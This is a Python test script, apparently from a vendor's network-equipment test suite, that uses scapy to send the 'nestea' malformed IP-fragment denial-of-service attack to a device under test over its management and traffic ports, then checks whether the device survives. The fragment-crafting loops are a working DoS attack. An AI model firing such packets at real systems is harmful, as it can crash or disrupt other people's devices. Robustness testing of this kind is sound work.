#!/usr/bin/python
#-*- coding: utf-8 -*-

#Filename: 100.3.py
#-----------------------------------------------------------------------------------
#Purpose: nestea
#
#
#Notes:
#History:
#        06/25/2013- Jefferson Sun,Created
#
#Copyright(c): Transition Networks, Inc.2013
#------------------------------------------------------------------------------------

from attack import *
from scapy.all import *
from PubModuleVitesse import PubReadConfig


def nestea(macsrc,ipsrc,ipdst,mgmtnic,trfcnic,num):
	AttackTest = AttackCases(ipdst)
	try:
		print "First to Test Management Port Attack"
		for i in range(num):
			send(IP(dst=ipdst,id=42,flags="MF")/UDP()/("X"*10),iface=mgmtnic)
			send(IP(dst=ipdst,id=42,frag=48)/("X"*116),iface=mgmtnic)
			send(IP(dst=ipdst,id=42,flags="MF")/UDP()/("X"*224),iface=mgmtnic)
		
		AttackTest.ChkDutSts()
		print "Start to Test Traffic Port Attack"
		conf.route.add(host=ipdst,dev=trfcnic)
		for i in range(num):
			AttackTest.fgarp(macsrc,ipsrc,ipdst,trfcnic)
			send(IP(dst=ipdst,id=42,flags="MF")/UDP()/("X"*10),iface=trfcnic)
			send(IP(dst=ipdst,id=42,frag=48)/("X"*116),iface=trfcnic)
			send(IP(dst=ipdst,id=42,flags="MF")/UDP()/("X"*224),iface=trfcnic)
			
		conf.route.resync()
		AttackTest.ChkDutSts()
	except:
		print "FAIL"
		sys.exit()


if __name__=="__main__":
        prmts = PubReadConfig("")
	num = 100
	mgmtnic = prmts.GetParameter("PC","MGMTNIC")
        trfcnic = prmts.GetParameter("PC","TRFCNIC")
	ipsrc = "192.168.3.187"
	ipdst = prmts.GetParameter("DUT1","IP")
	macsrc = "00:27:19:9b:17:a5"
	print "==========Start Testing nestea============="
	nestea(macsrc,ipsrc,ipdst,mgmtnic,trfcnic,num)
	print "==========nestea testing finished============"
	print "PASS"
